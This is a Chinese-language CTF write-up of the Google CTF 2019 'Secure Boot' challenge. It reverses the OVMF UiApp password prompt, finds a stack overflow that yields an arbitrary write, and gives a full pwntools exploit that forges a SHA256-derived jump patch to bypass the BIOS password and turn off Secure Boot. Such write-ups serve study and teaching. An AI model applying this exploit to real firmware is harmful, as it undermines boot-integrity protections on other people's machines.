---
title: Google CTF 2019 - Secure Boot 题解
date: 2019-07-22 21:47:32
tags: pwn
---

# 题目说明

Your task is very simple: just boot this machine. We tried before but we always get 'Security Violation'. For extra fancyness use `socat -,raw,echo=0 tcp:$IP:$PORT'`.

<!--more-->

你的任务很简单：仅仅需要运行这台机器。我们尝试过，但是总得到 `Security Violation`(安全违规)。更花哨一点的使用方法是 `socat -,raw,echo=0 tcp:$IP:$PORT`。

## About OVMF

OVMF 是一种流行的开源 UEFI 固件，现在已经被移植到了 QEMU 上。它实现了 UEFI 的规范，因此和真实机器上的商用 UEFI 固件非常相似。

# 题目分析

如果直接运行官方提供的 py 文件是这个效果：

```
UEFI Interactive Shell v2.2
EDK II
UEFI v2.70 (EDK II, 0x00010000)
Mapping table
      FS0: Alias(s):HD1a1:;BLK3:
          PciRoot(0x0)/Pci(0x1,0x1)/Ata(0x0)/HD(1,MBR,0xBE1AFDFA,0x3F,0xFBFC1)
     BLK0: Alias(s):
          PciRoot(0x0)/Pci(0x1,0x0)/Floppy(0x0)
     BLK1: Alias(s):
          PciRoot(0x0)/Pci(0x1,0x0)/Floppy(0x1)
     BLK2: Alias(s):
          PciRoot(0x0)/Pci(0x1,0x1)/Ata(0x0)
     BLK4: Alias(s):
          PciRoot(0x0)/Pci(0x1,0x1)/Ata(0x0)

If Secure Boot is enabled it will verify kernel's integrity and
return 'Security Violation' in case of inconsistency.
Booting...
Script Error Status: Security Violation (line number 5)
```

和题目中说的一样。

如果在这个输出之前按下 ESC 或 F12，就会有如下输出：

```
BdsDxe: loading Boot0000 "UiApp" from Fv(7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1)/FvFile(462CAA21-7614-4503-836E-8AB6F4662331)
BdsDxe: starting Boot0000 "UiApp" from Fv(7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1)/FvFile(462CAA21-7614-4503-836E-8AB6F4662331)
****************************
*                          *
*   Welcome to the BIOS!   *
*                          *
****************************

Password?
```

如果我们随便输入的话会报错。从上面的输出中我们可以看到一个重要的函数（文件？）：UiApp

通过 UEFITool 工具我们可以得到下面的文件列表：

![](https://raw.githubusercontent.com/40m41h42t/Images/master/2019/07/secboot-1.png)

通过 UEFI Firmware Parser 工具将其分离：

```bash
uefi-firmware-parser -ecO ./OVMF.fd
```

我们可以在这一大串输出中定向找到 UiApp：

UiApp

```
            File 38: 462caa21-7614-4503-836e-8ab6f4662331 type 0x09, attr 0x00, state 0x07, size 0x1beae (114350 bytes), (application)
              Section 0: type 0x10, size 0x1be44 (114244 bytes) (PE32 image section)
              Section 1: type 0x19, size 0x34 (52 bytes) (Raw section)
              Section 2: type 0x15, size 0x10 (16 bytes) (User interface name section)
              Name: UiApp
              Section 3: type 0x14, size 0xe (14 bytes) (Version section section)
```

分析该文件，我们可以找到 `Welcome to the BIOS!` 字符串：

![](https://raw.githubusercontent.com/40m41h42t/Images/master/2019/07/secboot-2.png)

由于它是以 UTF-16LE 格式进行编码的，因此直接搜是搜不到的，搜索格式应该是 `W\x00e\x00l\x00 ...` 这样子的。

EFI 对输入的处理有一个数据结构：

``` c
typedef struct {
UINT16  ScanCode;
CHAR16  UnicodeChar;
} EFI_INPUT_KEY;
```
向前追溯可以找到某个函数，整理一下是这个样子的：

``` c
signed __int64 welcome_to_BIOS()
{
  unsigned __int16 v0; // ax
  char v2; // [rsp+2Ch] [rbp-BCh]
  __int16 v3; // [rsp+2Eh] [rbp-BAh]
  char v4; // [rsp+30h] [rbp-B8h]
  char buf[128]; // [rsp+38h] [rbp-B0h]
  __int64 res; // [rsp+B8h] [rbp-30h]
  _QWORD *dest; // [rsp+C0h] [rbp-28h]
  __int64 size; // [rsp+C8h] [rbp-20h]
  unsigned __int16 i; // [rsp+D6h] [rbp-12h]
  unsigned __int64 tries; // [rsp+D8h] [rbp-10h]

  tries = 0i64;
  size = 32i64;
  puts(L"****************************\n");
  puts(L"*                          *\n");
  puts(L"*   Welcome to the BIOS!   *\n");
  puts(L"*                          *\n");
  puts(L"****************************\n\n");
  dest = (_QWORD *)sub_11A8(32i64);
  while ( tries <= 2 )
  {
    i = 0;
    puts(L"Password?\n");
    while ( 1 )
    {
      while ( 1 )
      {
        res = (*(__int64 (__fastcall **)(_QWORD, char *))(*(_QWORD *)(qword_1BC68 + 48) + 8i64))(
                *(_QWORD *)(qword_1BC68 + 48),
                &v2);
        if ( res >= 0 )
        {
          if ( v3 )
            break;
        }
        if ( res == 0x8000000000000006i64 )
          (*(void (__fastcall **)(signed __int64, signed __int64, char *))(qword_1BC78 + 96))(
            1i64,
            *(_QWORD *)(qword_1BC68 + 48) + 16i64,
            &v4);
      }
      if ( v3 == '\r' )
        break;
      if ( i <= 139u )
      {
        v0 = i++;
        buf[v0] = v3;
      }
      puts("*");
    }
    buf[i] = 0;
    puts(L"\n");
    sha256((__int64)buf, i, (__int64)dest);
    if ( *dest == 0xDEADBEEFDEADBEEFi64
      && dest[8] == 0xDEADBEEFDEADBEEFi64
      && dest[16] == 0xDEADBEEFDEADBEEFi64
      && dest[24] == 0xDEADBEEFDEADBEEFi64 )
    {
      doSomething((__int64)dest);
      return 1i64;
    }
    puts("W");
    ++tries;
  }
  doSomething((__int64)dest);
  return 0i64;
}
```

要求输入不多于 139 个字符，处理输入会用到 SHA256（通过某些特征数据可得）很明显要求 `buf` 经过哈希后得到 `0xDEADBEEF` 这样的数据。但很明显我们不可能得到哈希前的符合要求的数据，因此我们可以换一种方式。注意到输入是 139 而 `buf` 的大小只有 128，这会不会是一个溢出点呢？

我们可以溢出 12 位，接下来看一下它的栈帧：

```c
  unsigned __int16 v0; // ax
  char ScanCode; // [rsp+2Ch] [rbp-BCh]
  __int16 UnicodeChar; // [rsp+2Eh] [rbp-BAh]
  char v4; // [rsp+30h] [rbp-B8h]
  char buf[128]; // [rsp+38h] [rbp-B0h]
  __int64 res; // [rsp+B8h] [rbp-30h]
  _QWORD *dest; // [rsp+C0h] [rbp-28h]
  __int64 size; // [rsp+C8h] [rbp-20h]
  unsigned __int16 i; // [rsp+D6h] [rbp-12h]
  unsigned __int64 tries; // [rsp+D8h] [rbp-10h]
```

很明显可以溢出到 dest 上，也就是一个任意地址写。写到哪里比较合适呢？

一种思路是写这里：

```c
if ( *dest == 0xDEADBEEFDEADBEEFi64
      && dest[8] == 0xDEADBEEFDEADBEEFi64
      && dest[16] == 0xDEADBEEFDEADBEEFi64
      && dest[24] == 0xDEADBEEFDEADBEEFi64 )
    {
      doSomething((__int64)dest);
      return 1i64;
    }
    puts((__int64)"W");
    ++tries;
  }
  doSomething((__int64)dest);
  return 0i64;
}
```

我们看到，它在判断满足条件之后会进入一个函数然后返回 1，那么我们可不可以跳转到这里呢？看看这附近的汇编：

```
.text:0000000000010062                 jnz     short loc_1007B
.text:0000000000010064                 mov     rax, [rsp+0E8h+dest]
.text:000000000001006C                 mov     rdi, rax
.text:000000000001006F                 call    doSomething
.text:0000000000010074                 mov     eax, 1
.text:0000000000010079                 jmp     short done
.text:000000000001007B ; ---------------------------------------------------------------------------
.text:000000000001007B
.text:000000000001007B loc_1007B:                              ; CODE XREF: welcome_to_BIOS+173↑j
.text:000000000001007B                                         ; welcome_to_BIOS+1D4↑j ...
.text:000000000001007B                 lea     rcx, strWrong   ; "W"
.text:0000000000010082                 call    puts
.text:0000000000010087                 add     [rsp+0E8h+tries], 1
.text:0000000000010090
.text:0000000000010090 loop_f:                                 ; CODE XREF: welcome_to_BIOS+73↑j
.text:0000000000010090                 cmp     [rsp+0E8h+tries], 2
.text:0000000000010099                 jbe     loc_FEC8
.text:000000000001009F                 mov     rax, [rsp+0E8h+dest]
.text:00000000000100A7                 mov     rdi, rax
.text:00000000000100AA                 call    doSomething
.text:00000000000100AF                 mov     eax, 0
```

看上去很容易被利用哎：比较的最后一个跳转位于 0x10062，只需要在 0x1007B 处跳转到 0x10064 处就可以了！我们再看一下当前进程的  map：

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
               0x0           0x400000 rwxp   400000 0
         0x63df000          0x6bdf000 rwxp   800000 0
         0x6f2d000          0x772d000 rwxp   800000 0
         0x7730000          0x7f30000 rwxp   800000 0
         0x7ec0000          0x82c1000 rwxp   401000 0      [stack]
        0x69326000         0x69b26000 rwxp   800000 0
        0x6c246000         0x6ca46000 rwxp   800000 0
        0x742e7000         0x74ae7000 rwxp   800000 0
        0x752e6000         0x75ae6000 rwxp   800000 0
        0x94af5000         0x952f5000 rwxp   800000 0
       0x230246000        0x230a46000 rwxp   800000 0
       0x2b808c000        0x2b888c000 rwxp   800000 0
       0x7ebd7d000        0x7ec57d000 rwxp   800000 0
```

全都是 rwxp！我们可以进行任意的修改操作。跳转的距离就是 0x7B - 0x64 = 0x17。所以任意写的过程中，使得修改后的汇编位 `jmp $-0x17` 即可在后面完成跳转。

接下来就是调试啦，我们要找到真实的环境中相应汇编的位置。

## 调试

在 `run.py` 中 `qemu` 的一大串参数中加入 `-s` 参数，之后就可以本地通过 gdb `target remote localhost:1234` 进行调试了。细节就不多说了，由于它会对输入也有一个处理，在进入输入函数之后通过 gdb 连接，此时位于输入处理函数中。我们看 stack，在 `rsp + 120` 的位置能看到返回地址

![](https://raw.githubusercontent.com/40m41h42t/Images/master/2019/07/secboot-3.png)

对应的是 IDA 中的

```
.text:000000000000FF5E                 jmp     loc_FEDE
```

这样我们就可以通过偏移获得 0x1007B 的位置：0x1007B - 0xFF5E + 0x67DAF5E = 0x67DB07B。

接下来我们要编写 payload 了。由于其中会进行一次 SHA256，因此我们要让 SHA256 的输出等于 payload：

```python
from pwn import *
import hashlib
import binascii

target = 0x67db07b

def find_sha(myasm):
    for i in xrange(1000000):
        payload = str(i)
        payload = payload.ljust(128, 'a')
        payload += '\x00' * 8 # 截断
        payload += p32(target)
        if binascii.unhexlify(hashlib.sha256(payload).hexdigest())[0:len(myasm)] == myasm:
            print('[1] payload: ', payload)
            payload = str(i)
            payload = payload.ljust(136, 'a')
            payload += p32(target)
            print('[2] payload: ', payload)
            return payload

find_sha(asm('jmp $-0x17'))
```

这样我们就构造好了 payload。开始寻找的时候为什么要用 `payload += 'x00'*8` 呢？因为我们覆盖了 res 那一部分，而 res 的值是会随着输入而变化的，因此第 128 位到 136 位都会被修改位为 NULL。而后面将这里填充可能是输入函数不会处理 `\x00` 这样的值，所以我们还得补充上去。

我们调试一下。下面汇编位置在输入后， Hash 函数之前。

```
.text:000000000000FF6E                 movzx   eax, [rsp+0E8h+i]
.text:000000000000FF76                 cdqe
.text:000000000000FF78                 mov     [rsp+rax+0E8h+buf], 0
```

0xFF6E 对应的下断点地址空间是：0x67DAF6E。

假如我们的输入是：`'1'*128+'23456789abcd'`，调试之后会发现栈中的内容是这样的：

![](https://raw.githubusercontent.com/40m41h42t/Images/master/2019/07/secboot-6.png)

很明显 `23456789` 的部分被截断了。

最后，完整的 payload 构造如下：

```python
from pwn import *
import hashlib
import binascii
import os
import tempfile

target = 0x67db07b

context(os='linux',arch='amd64') #,log_level='debug')

def find_sha(myasm):
    for i in xrange(1000000):
        payload = str(i)
        payload = payload.ljust(128, 'a')
        payload += '\x00' * 8
        payload += p32(target)
        if binascii.unhexlify(hashlib.sha256(payload).hexdigest())[0:len(myasm)] == myasm:
            print('[1] payload: ', payload)
            print(hashlib.sha256(payload).hexdigest())
            payload = str(i)
            payload = payload.ljust(136, 'a')
            payload += p32(target)
            print('[2] payload: ', payload)
            print(hashlib.sha256(payload).hexdigest())
            return payload

def exploit(p):
    p.sendafter('2J',"\x1b\x5b\x32\x34\x7e"*10)
    payload = find_sha(asm("jmp $-0x17"))
    payload += "\r"
    
    p.sendafter("Password?", payload)
    p.interactive()

def local():
    fname = tempfile.NamedTemporaryFile().name
    os.system("cp OVMF.fd %s" % (fname))
    os.system("chmod u+w %s" % (fname))

    # os.system("qemu-system-x86_64 -s -monitor /dev/null -m 128M -drive if=pflash,format=raw,file=%s -drive file=fat:rw:contents,format=raw -net none -nographic 2> /dev/null" % (fname))
    p = process(['qemu-system-x86_64','-s','-m','128M','-drive','if=pflash,format=raw,file='+fname,'-drive','file=fat:rw:contents,format=raw','-net','none','-nographic'], env={})
    exploit(p)
    os.system("rm -rf %s" % (fname))

if __name__ == "__main__":
    # p = remote("secureboot.ctfcompetition.com", 1337)
    local()
```

直接用 pwntools 的输出的话很坑，但是题目中也提供了一种输出方式。

本地调试：

```bash
socat -,raw,echo=0 SYSTEM:"python ./payload.py"
```

![](https://raw.githubusercontent.com/40m41h42t/Images/master/2019/07/secboot-4.png)

可以看到，它提供了一个不错的界面。我们进入 Device Manager，进入 Secure Boot Configuration，关闭 Attempt Secure Boot，保存退出即可。

最终即可得到 flag：

![](https://raw.githubusercontent.com/40m41h42t/Images/master/2019/07/secboot-5.png)

# 总结

虽然看上去有点麻烦，但是仔细分析的话它的漏洞其实很容易利用。。不过我好菜啊，看了两天。。最后还把虚拟机搞崩了，但是 WSL 还能用，太舒服了。。

# 工具收集

[UEFI Firmware Parser](https://github.com/theopolis/uefi-firmware-parser)

[UEFITool](https://github.com/LongSoft/UEFITool)

# 参考文章

[Secure Boot - Google CTF 2019 Quals](https://devcraft.io/2019/06/25/secure-boot-google-ctf-2019-quals.html)

[2019-06-22-Google-CTF-Quals](https://github.com/EmpireCTF/empirectf/tree/master/writeups/2019-06-22-Google-CTF-Quals)

[UEFI](https://wiki.osdev.org/UEFI)

[OVMF](https://github.com/tianocore/tianocore.github.io/wiki/OVMF)

[efi__console_8c_source](https://dox.ipxe.org/efi__console_8c_source.html#l00279)

[XTerm Control Sequences](https://invisible-island.net/xterm/ctlseqs/ctlseqs.html)

[Everything you never wanted to know about ANSI escape codes](https://notes.burke.libbey.me/ansi-escape-codes/)

[【pwn】诡异的movsx和cdqe](https://wintersun.space/2016/06/08/%E3%80%90pwn%E3%80%91%E8%AF%A1%E5%BC%82%E7%9A%84movsx%E5%92%8Ccdqe/)